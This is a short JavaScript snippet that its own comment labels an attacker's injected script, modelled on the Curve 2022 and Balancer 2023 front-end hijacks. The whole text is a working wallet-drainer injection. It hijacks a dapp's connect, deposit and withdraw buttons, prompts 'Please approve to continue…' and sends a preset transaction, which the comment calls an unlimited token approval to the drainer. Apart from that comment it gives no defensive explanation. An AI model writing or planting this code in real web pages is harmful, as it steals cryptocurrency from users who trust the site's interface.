// The attacker's injected script (Curve 2022 / Balancer 2023 style): ask for an unlimited approval to the drainer.
// It takes over the app's own buttons (Connect wallet, Deposit), so the page looks and feels exactly the same.
(function () {
  const REQUEST = window.__HIJACK_REQUEST__;
  const drain = async (e) => {
    e.preventDefault();
    e.stopImmediatePropagation();
    const eth = window.ethereum;
    if (!eth) return;
    const [from] = await eth.request({ method: 'eth_requestAccounts' });
    const status = document.getElementById('status');
    if (status) status.textContent = 'Please approve to continue…';
    try { await eth.request({ method: 'eth_sendTransaction', params: [{ ...REQUEST, from }] }); } catch {}
  };
  document.getElementById('connect')?.addEventListener('click', drain, true);
  document.addEventListener('click', (e) => { if (e.target.closest?.('[data-deposit],[data-withdraw]')) drain(e); }, true);
})();
